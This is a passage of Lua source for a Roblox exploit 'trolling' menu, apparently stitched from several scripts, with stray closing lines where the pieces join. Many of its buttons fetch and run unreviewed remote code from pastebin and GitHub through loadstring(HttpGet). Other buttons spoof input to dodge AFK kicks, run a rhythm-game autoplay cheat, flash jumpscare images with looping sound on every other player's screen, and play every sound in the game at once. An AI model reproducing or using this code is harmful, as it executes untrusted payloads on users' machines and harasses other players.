hdfgkhkdfhk.TextColor3 = Color3.fromRGB(0, 0, 0)
hdfgkhkdfhk.TextScaled = true
hdfgkhkdfhk.TextSize = 14.000
hdfgkhkdfhk.TextWrapped = true

loadtools.Name = "loadtools"
loadtools.Parent = savetoolframe
loadtools.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
loadtools.BorderSizePixel = 0
loadtools.Position = UDim2.new(0.0365853645, 0, 0.0436241627, 0)
loadtools.Size = UDim2.new(0, 151, 0, 61)
loadtools.Font = Enum.Font.RobotoMono
loadtools.Text = "LOAD TOOLS"
loadtools.TextColor3 = Color3.fromRGB(255, 255, 255)
loadtools.TextSize = 20.000
loadtools.TextWrapped = true

savetools.Name = "savetools"
savetools.Parent = savetoolframe
savetools.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
savetools.BorderSizePixel = 0
savetools.Position = UDim2.new(0.0365853645, 0, 0.305369139, 0)
savetools.Size = UDim2.new(0, 151, 0, 61)
savetools.Font = Enum.Font.RobotoMono
savetools.Text = "SAVE TOOLS"
savetools.TextColor3 = Color3.fromRGB(255, 255, 255)
savetools.TextSize = 20.000
savetools.TextWrapped = true

ouiyoyuio.Name = "ouiyoyuio"
ouiyoyuio.Parent = savetoolframe
ouiyoyuio.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ouiyoyuio.BackgroundTransparency = 1.000
ouiyoyuio.Position = UDim2.new(0.0927819982, 0, 0.576754153, 0)
ouiyoyuio.Size = UDim2.new(0, 131, 0, 97)
ouiyoyuio.Font = Enum.Font.SourceSansBold
ouiyoyuio.Text = "this script saves your tools so whenever you die, press save tools and then whenever you respawn the tools will be back in your inventory"
ouiyoyuio.TextColor3 = Color3.fromRGB(255, 255, 255)
ouiyoyuio.TextScaled = true
ouiyoyuio.TextSize = 14.000
ouiyoyuio.TextWrapped = true

rainbow1.Name = "rainbow1"
rainbow1.Parent = mainframe
rainbow1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rainbow1.BorderSizePixel = 4
rainbow1.Position = UDim2.new(0, 0, -0.038181819, 0)
rainbow1.Size = UDim2.new(0, 148, 0, 21)

rainbow2.Name = "rainbow2"
rainbow2.Parent = mainframe
rainbow2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
rainbow2.BorderSizePixel = 4
rainbow2.Position = UDim2.new(0, 0, 1.00727272, 0)
rainbow2.Size = UDim2.new(0, 148, 0, 21)

r6frame.Name = "r6frame"
r6frame.Parent = mainframe
r6frame.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
r6frame.BorderSizePixel = 4
r6frame.Position = UDim2.new(1, 0, 0.514545441, 0)
r6frame.Size = UDim2.new(0, 164, 0, 298)
r6frame.Visible = false

r6blockhead.Name = "r6blockhead"
r6blockhead.Parent = r6frame
r6blockhead.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6blockhead.BorderSizePixel = 0
r6blockhead.Position = UDim2.new(0.0426829271, 0, 0.0201342274, 0)
r6blockhead.Size = UDim2.new(0, 151, 0, 25)
r6blockhead.Font = Enum.Font.RobotoMono
r6blockhead.Text = "BlockHead"
r6blockhead.TextColor3 = Color3.fromRGB(255, 255, 255)
r6blockhead.TextSize = 20.000
r6blockhead.TextWrapped = true

r6creeper.Name = "r6creeper"
r6creeper.Parent = r6frame
r6creeper.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6creeper.BorderSizePixel = 0
r6creeper.Position = UDim2.new(0.0426829271, 0, 0.127516776, 0)
r6creeper.Size = UDim2.new(0, 151, 0, 25)
r6creeper.Font = Enum.Font.RobotoMono
r6creeper.Text = "Creeper script"
r6creeper.TextColor3 = Color3.fromRGB(255, 255, 255)
r6creeper.TextSize = 20.000
r6creeper.TextWrapped = true

r6Car.Name = "r6Car"
r6Car.Parent = r6frame
r6Car.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6Car.BorderSizePixel = 0
r6Car.Position = UDim2.new(0.0365853682, 0, 0.248322159, 0)
r6Car.Size = UDim2.new(0, 151, 0, 25)
r6Car.Font = Enum.Font.RobotoMono
r6Car.Text = "Race Car "
r6Car.TextColor3 = Color3.fromRGB(255, 255, 255)
r6Car.TextSize = 20.000
r6Car.TextWrapped = true

gdfhdfgh.Name = "gdfhdfgh"
gdfhdfgh.Parent = r6frame
gdfhdfgh.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
gdfhdfgh.BackgroundTransparency = 1.000
gdfhdfgh.Position = UDim2.new(0, 0, 1, 0)
gdfhdfgh.Size = UDim2.new(0, 164, 0, 20)
gdfhdfgh.Font = Enum.Font.SourceSansBold
gdfhdfgh.Text = "R6 Scripts"
gdfhdfgh.TextColor3 = Color3.fromRGB(0, 0, 0)
gdfhdfgh.TextScaled = true
gdfhdfgh.TextSize = 14.000
gdfhdfgh.TextWrapped = true

r6pyramid.Name = "r6pyramid"
r6pyramid.Parent = r6frame
r6pyramid.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6pyramid.BorderSizePixel = 0
r6pyramid.Position = UDim2.new(0.0426829308, 0, 0.3657718, 0)
r6pyramid.Size = UDim2.new(0, 151, 0, 25)
r6pyramid.Font = Enum.Font.RobotoMono
r6pyramid.Text = "Pyramid Script"
r6pyramid.TextColor3 = Color3.fromRGB(255, 255, 255)
r6pyramid.TextSize = 20.000
r6pyramid.TextWrapped = true

r6animations.Name = "r6animations"
r6animations.Parent = r6frame
r6animations.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6animations.BorderSizePixel = 0
r6animations.Position = UDim2.new(0.0426829308, 0, 0.493288577, 0)
r6animations.Size = UDim2.new(0, 151, 0, 25)
r6animations.Font = Enum.Font.RobotoMono
r6animations.Text = "AnimationGUI"
r6animations.TextColor3 = Color3.fromRGB(255, 255, 255)
r6animations.TextSize = 20.000
r6animations.TextWrapped = true

r6flingscript.Name = "r6flingscript"
r6flingscript.Parent = r6frame
r6flingscript.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6flingscript.BorderSizePixel = 0
r6flingscript.Position = UDim2.new(0.0426829308, 0, 0.607382536, 0)
r6flingscript.Size = UDim2.new(0, 151, 0, 25)
r6flingscript.Font = Enum.Font.RobotoMono
r6flingscript.Text = "FLING GUI"
r6flingscript.TextColor3 = Color3.fromRGB(255, 255, 255)
r6flingscript.TextSize = 20.000
r6flingscript.TextWrapped = true

r6admin.Name = "r6admin"
r6admin.Parent = r6frame
r6admin.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6admin.BorderSizePixel = 0
r6admin.Position = UDim2.new(0.0426829308, 0, 0.728187859, 0)
r6admin.Size = UDim2.new(0, 151, 0, 25)
r6admin.Font = Enum.Font.RobotoMono
r6admin.Text = "Shattervest "
r6admin.TextColor3 = Color3.fromRGB(255, 255, 255)
r6admin.TextSize = 20.000
r6admin.TextWrapped = true

r6antiafk.Name = "r6antiafk"
r6antiafk.Parent = r6frame
r6antiafk.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6antiafk.BorderSizePixel = 0
r6antiafk.Position = UDim2.new(0.0426829308, 0, 0.84563756, 0)
r6antiafk.Size = UDim2.new(0, 151, 0, 25)
r6antiafk.Font = Enum.Font.RobotoMono
r6antiafk.Text = "Anti-AFK"
r6antiafk.TextColor3 = Color3.fromRGB(255, 255, 255)
r6antiafk.TextSize = 20.000
r6antiafk.TextWrapped = true

racecarrequirement.Name = "racecarrequirement"
racecarrequirement.Parent = r6frame
racecarrequirement.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
racecarrequirement.BorderSizePixel = 0
racecarrequirement.Position = UDim2.new(1, 0, 0.241610751, 0)
racecarrequirement.Size = UDim2.new(0, 28, 0, 28)
racecarrequirement.Font = Enum.Font.SourceSans
racecarrequirement.Text = "?"
racecarrequirement.TextColor3 = Color3.fromRGB(0, 0, 0)
racecarrequirement.TextScaled = true
racecarrequirement.TextSize = 14.000
racecarrequirement.TextWrapped = true

carframe.Name = "carframe"
carframe.Parent = r6frame
carframe.BackgroundColor3 = Color3.fromRGB(58, 58, 58)
carframe.BorderSizePixel = 0
carframe.Position = UDim2.new(1.23170733, 0, 0.120805368, 0)
carframe.Size = UDim2.new(0, 100, 0, 100)
carframe.Visible = false

closecar.Name = "closecar"
closecar.Parent = carframe
closecar.BackgroundColor3 = Color3.fromRGB(81, 81, 81)
closecar.BorderSizePixel = 0
closecar.Position = UDim2.new(0, 0, 0.850000024, 0)
closecar.Size = UDim2.new(0, 100, 0, 15)
closecar.Font = Enum.Font.SourceSansBold
closecar.Text = "CLOSE"
closecar.TextColor3 = Color3.fromRGB(0, 0, 0)
closecar.TextScaled = true
closecar.TextSize = 14.000
closecar.TextWrapped = true

fasdfasf.Name = "fasdfasf"
fasdfasf.Parent = carframe
fasdfasf.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
fasdfasf.BackgroundTransparency = 1.000
fasdfasf.Size = UDim2.new(0, 100, 0, 47)
fasdfasf.Font = Enum.Font.SourceSansBold
fasdfasf.Text = "This Script Requires A certain hat to be run"
fasdfasf.TextColor3 = Color3.fromRGB(255, 255, 255)
fasdfasf.TextScaled = true
fasdfasf.TextSize = 14.000
fasdfasf.TextWrapped = true

vxcvxcv.Name = "vxcvxcv"
vxcvxcv.Parent = carframe
vxcvxcv.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
vxcvxcv.BackgroundTransparency = 1.000
vxcvxcv.Position = UDim2.new(0, 0, 0.469999999, 0)
vxcvxcv.Size = UDim2.new(0, 100, 0, 38)
vxcvxcv.Font = Enum.Font.SourceSansBold
vxcvxcv.Text = "Hat : Elitoria-RN750"
vxcvxcv.TextColor3 = Color3.fromRGB(255, 255, 255)
vxcvxcv.TextScaled = true
vxcvxcv.TextSize = 14.000
vxcvxcv.TextWrapped = true

r15open.Name = "r15open"
r15open.Parent = mainframe
r15open.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r15open.BorderSizePixel = 0
r15open.Position = UDim2.new(0.515655935, 0, 0.060561303, 0)
r15open.Size = UDim2.new(0, 71, 0, 188)
r15open.Font = Enum.Font.RobotoMono
r15open.Text = "R15 Scripts"
r15open.TextColor3 = Color3.fromRGB(255, 255, 255)
r15open.TextSize = 20.000
r15open.TextWrapped = true

r6open.Name = "r6open"
r6open.Parent = mainframe
r6open.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
r6open.BorderSizePixel = 0
r6open.Position = UDim2.new(0.515655935, 0, 0.627834022, 0)
r6open.Size = UDim2.new(0, 71, 0, 188)
r6open.Font = Enum.Font.RobotoMono
r6open.Text = "R6 Scripts"
r6open.TextColor3 = Color3.fromRGB(255, 255, 255)
r6open.TextSize = 20.000
r6open.TextWrapped = true

opentools.Name = "opentools"
opentools.Parent = mainframe
opentools.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
opentools.BorderSizePixel = 0
opentools.Position = UDim2.new(-0.00461435318, 0, 0.058743123, 0)
opentools.Size = UDim2.new(0, 71, 0, 188)
opentools.Font = Enum.Font.RobotoMono
opentools.Text = "Save     &    Load Tools"
opentools.TextColor3 = Color3.fromRGB(255, 255, 255)
opentools.TextSize = 20.000
opentools.TextWrapped = true

utyuty.Name = "utyuty"
utyuty.Parent = mainframe
utyuty.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
utyuty.BackgroundTransparency = 1.000
utyuty.Position = UDim2.new(0.0561964698, 0, 0, 0)
utyuty.Size = UDim2.new(0, 131, 0, 29)
utyuty.Font = Enum.Font.SourceSansBold
utyuty.Text = "FE TROLLING GUI V2"
utyuty.TextColor3 = Color3.fromRGB(255, 255, 255)
utyuty.TextScaled = true
utyuty.TextSize = 14.000
utyuty.TextWrapped = true

otheropen.Name = "otheropen"
otheropen.Parent = mainframe
otheropen.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
otheropen.BorderSizePixel = 0
otheropen.Position = UDim2.new(-0.00461435318, 0, 0.627834022, 0)
otheropen.Size = UDim2.new(0, 71, 0, 188)
otheropen.Font = Enum.Font.RobotoMono
otheropen.Text = "Other Scripts"
otheropen.TextColor3 = Color3.fromRGB(255, 255, 255)
otheropen.TextSize = 20.000
otheropen.TextWrapped = true

mbnmbnm.Name = "mbnmbnm"
mbnmbnm.Parent = mainframe
mbnmbnm.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mbnmbnm.BackgroundTransparency = 1.000
mbnmbnm.Position = UDim2.new(0.0561964698, 0, 0.419999987, 0)
mbnmbnm.Size = UDim2.new(0, 131, 0, 29)
mbnmbnm.Font = Enum.Font.SourceSansBold
mbnmbnm.Text = "GUI made by MastersMZ on YT"
mbnmbnm.TextColor3 = Color3.fromRGB(255, 255, 255)
mbnmbnm.TextScaled = true
mbnmbnm.TextSize = 14.000
mbnmbnm.TextWrapped = true

mbnmbnm_2.Name = "mbnmbnm"
mbnmbnm_2.Parent = mainframe
mbnmbnm_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
mbnmbnm_2.BackgroundTransparency = 1.000
mbnmbnm_2.Position = UDim2.new(0.0561964698, 0, 0.485454559, 0)
mbnmbnm_2.Size = UDim2.new(0, 131, 0, 63)
mbnmbnm_2.Font = Enum.Font.SourceSansBold
mbnmbnm_2.Text = "Scripts with a ? next to them Require a Hat to use (press ? on them to see requirements)"
mbnmbnm_2.TextColor3 = Color3.fromRGB(255, 0, 0)
mbnmbnm_2.TextScaled = true
mbnmbnm_2.TextSize = 14.000
mbnmbnm_2.TextWrapped = true



game:GetService("StarterGui"):SetCore("SendNotification",{
	Title = "Trolling GUI";
	Text = "Press Z To Open :))";
})

wait(2)

-- Functions ---

mainframe.Active = true
mainframe.Draggable = true



closecar.MouseButton1Click:connect(function()
	carframe.Visible = false
end)

racecarrequirement.MouseButton1Click:connect(function()
	carframe.Visible = true
end)

skateopen.MouseButton1Click:connect(function()
	skateframe.Visible = true
end)

closeskate.MouseButton1Click:connect(function()
	skateframe.Visible = false
end)

local hotkey = "z" -- must be lowercase
local mouse = game.Players.LocalPlayer:GetMouse()

mouse.KeyDown:Connect(function(key)
	if key == hotkey then
		if mainframe.Visible then
			mainframe.Visible = not mainframe.Visible
		else
			mainframe.Visible = true
		end
	end
end)

r15open.MouseButton1Click:connect(function()
	if r15frame.Visible == false then
		r15frame.Visible = true
	else
		r15frame.Visible = false
	end
end)

r6open.MouseButton1Click:connect(function()
	if r6frame.Visible == false then
		r6frame.Visible = true
	else
		r6frame.Visible = false
	end
end)

otheropen.MouseButton1Click:connect(function()
	if otherframe.Visible == false then
		otherframe.Visible = true
	else
		otherframe.Visible = false
	end
end)

opentools.MouseButton1Click:connect(function()
	if savetoolframe.Visible == false then
		savetoolframe.Visible = true
	else
		savetoolframe.Visible = false
	end
end)

---- scripts -----

r15blockhead.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.Head.Mesh:destroy()
end)

r15creeper.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.Head.Mesh:destroy()
	function doo(limb, pos)
		limb:BreakJoints()
		local velocity = Instance.new("RocketPropulsion", limb)
		velocity.CartoonFactor = 0
		velocity.MaxSpeed = 30
		velocity.MaxThrust = 9999
		velocity.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		velocity.Target = game.Players.LocalPlayer.Character.UpperTorso
		velocity.TargetOffset = pos
		velocity:fire()
		local b = Instance.new("BodyGyro", limb)
	end
	while wait() do
		doo(game.Players.LocalPlayer.Character["LeftUpperArm"], Vector3.new(-0.5,-2,-1))
		doo(game.Players.LocalPlayer.Character["RightUpperArm"], Vector3.new(0.5,-2,-1))
		doo(game.Players.LocalPlayer.Character["LeftUpperLeg"], Vector3.new(-0.5,-2,1))
		doo(game.Players.LocalPlayer.Character["RightUpperLeg"], Vector3.new(0.5,-2,1))
	end
end)

r15waist.MouseButton1Click:connect(function()
	if (game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) then
		if (game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso")) then
			if (game.Players.LocalPlayer.Character.UpperTorso:FindFirstChild("Waist")) then
				game.Players.LocalPlayer.Character.UpperTorso.Waist:remove()
			end
		end
	else
		print('Not R15!')
	end
end)

r15blockhats.MouseButton1Click:connect(function()
	for _,v in pairs(game.Players.LocalPlayer:GetChildren()) do
		if (v:IsA("Tool")) then
			v.Parent = game.Players.LocalPlayer.Backpack
		end
	end
end)

r15animations.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/uUR6pFVv", true))()
end)

r15invisible.MouseButton1Click:connect(function()
	if (game.Players.LocalPlayer.Character.Humanoid.RigType == Enum.HumanoidRigType.R15) then
		if (game.Players.LocalPlayer.Character:FindFirstChild("LowerTorso")) then
			if (game.Players.LocalPlayer.Character.LowerTorso:FindFirstChild("Root")) then
				game.Players.LocalPlayer.Character.LowerTorso.Root:remove()
			end
		end
	else
		print('Not R15!')
	end
end)

r15admin.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/CKbPg9NC", true))()
end)

r15antiafk.MouseButton1Click:connect(function()
	local VirtualUser=game:service'VirtualUser'
	game:service'Players'.LocalPlayer.Idled:connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)
end)

dogscript.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/uB5LJvmb", true))()
end)

skatescript.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/XAXCaupJ"))()
--[[ Made by machport
Hat Needed: https://www.roblox.com/catalog/5063577434/COLD-STARE-SKATEBOARD
]]--
end)

fathonhub.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/UmhaEvTT",true))()
end)

legacyhub.MouseButton1Click:connect(function()
	loadstring(game:GetObjects("rbxassetid://1683559539")[1].Source)()
end)

phonegui.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/nScPDiay", true))()
end)

ezhub.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)

ragdoll.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/T7weKqag'),true))()
end)

topkek.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://pastebin.com/raw/uCaH93dP'),true))()
end)

loadtools.MouseButton1Click:connect(function()

	for _,v in pairs(game.Players.LocalPlayer:GetChildren()) do
		if (v:IsA("Tool")) then
			v.Parent = game.Players.LocalPlayer.Backpack
		end
	end
end)

savetools.MouseButton1Click:connect(function()
	for _,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
		if (v:IsA("Tool")) then
			v.Parent = game.Players.LocalPlayer
		end
	end
end)

r6blockhead.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.Head.Mesh:destroy()
end)

r6creeper.MouseButton1Click:connect(function()
	game.Players.LocalPlayer.Character.Head.Mesh:destroy()
	function doo(limb, pos)
		limb:BreakJoints()
		local velocity = Instance.new("RocketPropulsion", limb)
		velocity.CartoonFactor = 0
		velocity.MaxSpeed = 30
		velocity.MaxThrust = 9999
		velocity.MaxTorque = Vector3.new(math.huge,math.huge,math.huge)
		velocity.Target = game.Players.LocalPlayer.Character.Torso
		velocity.TargetOffset = pos
		velocity:fire()
		local b = Instance.new("BodyGyro", limb)
	end
	while wait() do
		doo(game.Players.LocalPlayer.Character["Left Arm"], Vector3.new(-0.5,-2,-1))
		doo(game.Players.LocalPlayer.Character["Right Arm"], Vector3.new(0.5,-2,-1))
		doo(game.Players.LocalPlayer.Character["Left Leg"], Vector3.new(-0.5,-2,1))
		doo(game.Players.LocalPlayer.Character["Right Leg"], Vector3.new(0.5,-2,1))
	end
end)

r6Car.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/MonkoTubeYT/carscript/master/!carscript.lua',true))()
end)

r6pyramid.MouseButton1Click:connect(function()
	local plr = game.Players.LocalPlayer
	game:GetService("RunService").Stepped:Connect(function()
		setsimulationradius(9e9,9e9)
		plr.ReplicationFocus = workspace
		settings().Physics.AllowSleep = false
	end)

	local runservice=game:service"RunService";
	local player=game:service"Players"["LocalPlayer"];
	local character=player["Character"];
	local blacklisted="Head Torso HumanoidRootPart";
	local limbs={};

	character["Humanoid"].HipHeight=2;
	--character["Head"]:FindFirstChildOfClass"SpecialMesh":Destroy();

	for i,v in next,character:children() do
		if (v.ClassName=="Part") and not blacklisted:find(v.Name) then
			v:BreakJoints();
			limbs[v.Name]=v;
		end
	end

	while runservice["Heartbeat"]:Wait() do
		limbs["Left Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(-1,-2,0);
		limbs["Right Leg"].CFrame=character["HumanoidRootPart"].CFrame*CFrame.new(1,-2,0);
		limbs["Left Arm"].CFrame=character["Left Leg"].CFrame*CFrame.new(-1,-2,0);
		limbs["Right Arm"].CFrame=character["Right Leg"].CFrame*CFrame.new(1,-2,0);
	end
end)

r6animations.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/uUR6pFVv", true))()
end)

r6flingscript.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/EntUzD5J", true))();
end)

r6admin.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebin.com/raw/CKbPg9NC", true))()
end)

r6antiafk.MouseButton1Click:connect(function()
	local VirtualUser=game:service'VirtualUser'
	game:service'Players'.LocalPlayer.Idled:connect(function()
		VirtualUser:CaptureController()
		VirtualUser:ClickButton2(Vector2.new())
	end)
end)



------ Scripts end ----

function zigzag(X) return math.acos(math.cos(X*math.pi))/math.pi end

counter = 0

while wait(0.1)do
	rainbow1.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)
	rainbow2.BackgroundColor3 = Color3.fromHSV(zigzag(counter),1,1)

	counter = counter + 0.01
end
end)
Tab3Section:NewButton("RICKROLL >:)", "RICKROLL EVERYONE", function(RR)
---credit to DedFense
local s = Instance.new("Sound") 

s.Name = "Name" 
s.SoundId = "rbxassetid://2672209057" 
s.Volume = 7 
s.Looped = true 
s.archivable = false 

s.Parent = game.Workspace 

wait(1) 

s:play()
discord=Instance.new("Hint")
discord.Text = "CHINAAAAAAAAAAA BAHAHAHAHAHAH"
discord.Parent = game.Workspace
local me = "DeadDefense" -- You don't get jumpscared.
while wait() do
for i,v in pairs(game.Players:GetPlayers()) do
       if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
               spawn(function()
                       local newgui = Instance.new("ScreenGui",v.PlayerGui)
                       newgui.Name = "Screamer"
                       local newimage = Instance.new("ImageLabel",newgui)
                       newimage.Image = "http://www.roblox.com/asset/?id=839013297"
                       newimage.Size = UDim2.new(1,0,1,0)
                       local s = Instance.new("Sound",newgui)
                       s.SoundId = "rbxassetid://1662"
                       s.Volume = 1
                       s.Looped = true
                       s:Play()
                       print("Screamed "..v.Name)
                       while wait() do
                               newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
                               wait()
                               newimage.ImageColor3 = Color3.new(1,1,1)
                       end
               end)
       end
end
end
end)
Tab3Section:NewButton("China", "CHINA", function(china)
---credit to DedFense
local s = Instance.new("Sound") 

s.Name = "Name" 
s.SoundId = "rbxassetid://2672209057" 
s.Volume = 7 
s.Looped = true 
s.archivable = false 

s.Parent = game.Workspace 

wait(1) 

s:play()
discord=Instance.new("Hint")
discord.Text = "EZ CHINA"
discord.Parent = game.Workspace
local me = "DeadDefense" -- You don't get jumpscared.
while wait() do
for i,v in pairs(game.Players:GetPlayers()) do
       if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
               spawn(function()
                       local newgui = Instance.new("ScreenGui",v.PlayerGui)
                       newgui.Name = "Screamer"
                       local newimage = Instance.new("ImageLabel",newgui)
                       newimage.Image = "http://www.roblox.com/asset/?id=8150651237"
                       newimage.Size = UDim2.new(1,0,1,0)
                       local s = Instance.new("Sound",newgui)
                       s.SoundId = "rbxassetid://1662"
                       s.Volume = 1
                       s.Looped = true
                       s:Play()
                       print("Screamed "..v.Name)
                       while wait() do
                               newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
                               wait()
                               newimage.ImageColor3 = Color3.new(1,1,1)
                       end
               end)
       end
end
end
end)
Tab3Section:NewButton("Funky Friday Aimbot", "Starts the Aimbot", function(FF)
 
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
   vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
   wait(1)
   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
 local message = Instance.new("Message", workspace)
        message.Text = "Loaded! If the script is not working, press 'F9' to check for any errors."
        wait(4.5)
        message:Destroy()
end)
Tab3Section:NewButton("Color Block Script", "Opens a Color Block Script", function(CBS)
loadstring(game:HttpGet('https://raw.githubusercontent.com/2dgeneralspam1/lua-releases/main/scripts/block-game.lua'))()
end)
Tab3Section:NewButton("Earrape V2", "MAKES EARRAPE SOUNDS", function(ER)
--// Doesn't work if RespectFilteringEnabled is enabled
print(game:GetService("SoundService").RespectFilteringEnabled)

--// Get's every sound instance in workspace and play's it (Earrape btw)
for _, sound in next, workspace:GetDescendants() do
   if sound:IsA("Sound") then
       sound:Play()
   end
end
end)